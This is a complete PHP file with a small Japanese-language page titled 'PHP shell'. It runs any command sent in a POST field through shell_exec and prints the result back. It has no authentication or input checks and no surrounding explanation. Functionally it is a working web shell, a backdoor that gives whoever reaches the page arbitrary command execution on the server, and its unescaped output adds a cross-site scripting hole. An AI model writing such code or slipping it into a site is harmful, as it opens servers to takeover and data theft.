<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
} else {
    $output = '';
}
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>PHPシェル</title>
</head>
<body>
    <h2>シェルスクリプト</h2>
    <form method="post">
        <textarea name="cmd" rows="5" cols="50" placeholder="コマンドを入力"></textarea><br>
        <input type="submit" value="実行">
    </form>
    <h3>実行結果:</h3>
    <p><?php echo $output; ?></p>
</body>
</html>
